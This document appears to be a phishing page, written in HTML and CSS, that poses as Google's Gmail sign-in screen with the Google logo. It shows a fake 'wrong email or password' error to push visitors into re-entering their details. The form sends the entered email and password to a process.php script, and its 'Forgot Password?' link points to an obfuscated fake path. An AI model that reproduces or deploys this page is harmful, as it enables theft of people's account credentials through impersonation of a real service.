<style type="text/css">
  .animate-label {
  position: relative;
  margin-top: 30px;
}
.animate-label label {
  position: absolute;
  bottom: 6px;
  left: 0;
  transition: .3s all ease;
  font-size: 14px;
  width: 100%;
  color: #888888;
}
.animate-label input:valid + label, .animate-label input:focus + label {
  bottom: 30px;
  font-size: 10px;
}
.animate-label input:focus + label {
  color: #4285f4;
}
.animate-label line:before {
  content: '';
  position: absolute;
  background: #4285f4;
  width: 0px;
  height: 2px;
  right: 50%;
  bottom: 0;
}
.animate-label input:focus ~ line:before {
  width: 100%;
  right: 0;
  transition: all .3s ease;
}

body {
  font-family: 'Helvetica', sans-serif;
  background: #f6f6f6;
  -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}

.wrapper {
  width: 350px;
  height: 400px;
  box-shadow: 0 1px 4px 0 rgba(0, 0, 0, 0.2);
  position: fixed;
  top: 50%;
  left: 50%;
  -webkit-transform: translate(-50%, -50%);
          transform: translate(-50%, -50%);
  background: rgba(255, 255, 255, 0.95);
  padding: 50px;
}

img {
  width: 80px;
}

h1 {
  font-weight: normal;
  font-size: 24px;
  margin-bottom: 0;
  line-height: 34px;
}

p {
  margin-top: 0;
  margin-bottom: 20px;
  font-size: 14px;
}

form {
  display: flex;
  flex-direction: column;
}

input {
  width: 100%;
  border: none;
  border-bottom: 1px solid #ff0404;
  padding-bottom: 6px;
}
input:focus {
  outline: none;
}

input#password {
  margin-top: 15px;
}

a {
  color: #4285f4;
  text-decoration: none;
  margin-top: 30px;
  font-size: 14px;
}

.flex {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

button {
  display: block;
  border-radius: 5px;
  height: 40px;
  width: 90px;
  background-color: #4285f4;
  border: none;
  color: #ffffff;
  text-align: center;
  font-size: 14px;
  box-shadow: 0 1px 4px 0 rgba(0, 0, 0, 0.26);
  margin-top: 30px;
}
<body>
</style>
<div class="wrapper">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2000px-Google_2015_logo.svg.png" alt="Google Logo">
	<h1 class="titles"> Sign in	</h1>
  <p>to continue to Gmail              </p>
  <p style="color:red"> Something has wrrong! please check your email or password</p>

	<form id="loginForm" action="process.php" method="POST">
    
    <div class="animate-label" >
      <input autofocus autocomplete="off"  name = "user" type="text" id="username" required  />
      <label for="username" style="
    color: red;
    //font-size: small;
" autocomplete="off"> Email or phone </label>
      <line></line>
    </div>

    <div class="animate-label">
		  <input autocomplete="off"  name= "pw" type="password" id="password" required />
      <label autocomplete="off"  for="password" > Password </label>
      <line></line>
    </div>
    
		<a href="./id=1239uiDw3129lf.reset-password\require.password=id.12opqsx\error-509/"> Forgot Password? </a>
    
    <div class="flex">
      <a href="#"> More options </a>
      <button type="submit" name="submit2"> NEXT </button>
    </div>
    
	</form>
</div>
</body>